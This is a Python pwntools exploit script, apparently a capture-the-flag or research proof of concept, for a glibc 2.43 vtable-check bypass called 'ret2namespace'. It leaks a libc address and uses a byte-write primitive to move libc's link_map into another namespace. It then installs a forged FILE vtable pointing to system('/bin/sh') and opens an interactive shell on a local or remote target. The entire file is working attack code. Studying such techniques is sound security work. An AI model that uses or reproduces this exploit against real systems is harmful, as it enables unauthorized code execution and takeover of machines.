#!/usr/bin/env python3
"""
ret2namespace — Namespace Injection Bypass (glibc 2.43, BIND_NOW)

Bypasses _IO_vtable_check by moving libc's link_map into namespace 1.
The vtable validator sees l_ns != 0 and accepts the forged vtable.

Target: glibc 2.43 x86_64, Full RELRO + BIND_NOW + PIE + NX
"""
from pwn import *
import time

context.arch = "amd64"
context.log_level = "info"

# glibc 2.43 x86_64 — shared across builds
STDIN_IN_LIBC  = 0x2128e0
SYSTEM_OFF     = 0x5c560
LD_DRIFT       = 0x18720     # ld_base - stdin
RG_IN_LD       = 0x3d000     # _rtld_global in ld
VDSO_LM_IN_LD  = 0x3e8c0    # vdso link_map in ld
NS_SIZE        = 0x70        # sizeof(struct link_namespaces) in 2.43
DL_NNS_OFF     = 0x700      # 16 * NS_SIZE
FAKE_VT        = 0x200
UFLOW_SLOT     = 0x28

# These depend on the binary (number of loaded DSOs affects link_map placement)
OFFSETS = {
    "local": {"LM": 0xe980, "LM_LNS": 0xe9b0},   # ./vuln (local build)
    "dist":  {"LM": 0xe8e0, "LM_LNS": 0xe910},    # ./dist/ret2namespace
}


def exploit(target=None, mode="local"):
    off = OFFSETS[mode]

    if target:
        p = remote(*target)
    elif mode == "dist":
        p = process("./dist/ret2namespace")
    else:
        p = process("./vuln")

    p.recvuntil(b"stdin: ")
    stdin_addr = int(p.recvline().strip(), 16)
    p.recvuntil(b"format:")
    p.recvline()

    libc_base = stdin_addr - STDIN_IN_LIBC
    libc_lm   = stdin_addr + off["LM"]
    system    = libc_base + SYSTEM_OFF
    rg        = LD_DRIFT + RG_IN_LD

    log.info(f"libc  = {hex(libc_base)}")
    log.info(f"stdin = {hex(stdin_addr)}")

    def wb(o, v):
        p.sendline(f"{o} {v:02x}".encode())

    def wq(o, v):
        for i, b in enumerate(p64(v)):
            wb(o + i, b)

    # namespace injection
    wq(LD_DRIFT + VDSO_LM_IN_LD + 0x18, 0)
    wb(off["LM_LNS"], 1)
    wq(rg + NS_SIZE, libc_lm)
    wb(rg + DL_NNS_OFF, 2)

    # fake vtable + trigger
    wq(FAKE_VT + UFLOW_SLOT, system)
    for i, b in enumerate(b"/bin/sh\x00"):
        wb(i, b)
    wq(0xd8, stdin_addr + FAKE_VT)

    time.sleep(0.3)
    p.sendline(b"BREAK")
    time.sleep(0.3)
    p.sendline(b"id")
    log.success(p.recvline(timeout=3).decode().strip())
    p.interactive()


if __name__ == "__main__":
    import sys
    mode = "dist" if "--dist" in sys.argv else "local"
    target = None
    for arg in sys.argv[1:]:
        if ":" in arg and not arg.startswith("-"):
            host, port = arg.rsplit(":", 1)
            target = (host, int(port))
    exploit(target=target, mode=mode)
